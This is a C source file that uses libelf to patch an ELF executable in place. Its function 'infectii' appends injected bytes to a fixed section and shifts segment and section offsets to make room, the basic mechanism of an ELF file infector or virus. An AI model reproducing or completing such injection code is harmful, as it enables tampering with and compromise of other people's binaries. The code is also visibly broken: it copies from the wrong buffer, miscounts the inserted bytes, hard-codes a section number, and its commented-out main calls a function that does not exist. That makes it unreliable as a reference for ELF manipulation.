/*
 * main.c
 *
 *  Created on: 2013-11-16
 *      Author: huangtao
 */
#include <err.h>
#include <fcntl.h>

#include <gelf.h>
//#include <libelf.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int infectii(char* file){
	int insertions[6] = {0xff, 0x35, 0x30, 0x83, 0x04, 0x08};
	int insert_size = sizeof(insertions);

	int fd;
	Elf* e;
	GElf_Ehdr ehdr;
	GElf_Phdr phdr;
	GElf_Shdr shdr;

	if (elf_version(EV_CURRENT) == EV_NONE)
		errx(EXIT_FAILURE, " ELF library initialization failed : %s ",
				elf_errmsg(-1));

	if ((fd = open(file, O_RDWR, 0)) < 0)
		err(EXIT_FAILURE, " open %s failed ", file);

	if ((e = elf_begin(fd, ELF_C_RDWR, NULL)) == NULL)
		errx(EXIT_FAILURE, " elf_begin () failed : %s . ", elf_errmsg(-1));

	if (elf_kind(e) != ELF_K_ELF)
		errx(EXIT_FAILURE, " %s is not an elf object. ", file);

	if (gelf_getehdr(e, &ehdr) == NULL)
		errx(EXIT_FAILURE, " get_ehdr () failed : %s . ", elf_errmsg(-1));

	//修改header中section header的偏移
	ehdr.e_shoff = ehdr.e_shoff + insert_size;
	gelf_update_ehdr(e, &ehdr);

	printf("1\n");
	//找到发生改变的program header，修改filesz和memsz；其后受到影响的，改变offset
	int phdr_num = ehdr.e_phnum;
	//Elf64_Xword p_filesz_origin = 0;
	int i = 0;
	for (; i < phdr_num; i ++) {
		gelf_getphdr(e, i, &phdr);
		if (phdr.p_type == PT_LOAD && phdr.p_offset == 0) {
			phdr.p_filesz += insert_size;
			phdr.p_memsz += insert_size;
		} else {
			phdr.p_offset += insert_size;
			phdr.p_vaddr += insert_size;
		}
		gelf_update_phdr(e, i, &phdr);
	}
	printf("2\n");

	int shdr_num = ehdr.e_shnum;
	i = 17;
	for (; i < shdr_num; i ++) {

		Elf_Scn* scn = elf_getscn(e, i);
		gelf_getshdr(scn, &shdr);
		Elf_Data* data = NULL;

		if (i == 17) {
			shdr.sh_size += insert_size;
			printf("sh_size = %x", shdr.sh_size);

			data = elf_getdata(scn, data);
			char* tmp = malloc(shdr.sh_size);
			memcpy(tmp, data, shdr.sh_size - insert_size);
			memcpy(tmp + shdr.sh_size - insert_size, insertions, insert_size);

			memcpy(data, tmp, shdr.sh_size);

		} else {
			shdr.sh_offset += insert_size;
			shdr.sh_addr += insert_size;
		}

		gelf_update_shdr(scn, &shdr);
	}
	printf("3\n");
	elf_update(e, ELF_C_WRITE);

	return 0;
}
/*
int main(int argc, char* argv[]) {
	if ( argc != 2){
		errx ( EXIT_FAILURE , " usage : %s file - name " , argv [0]);
	}

	infect(argv[1]);

	return 0;
}


*/
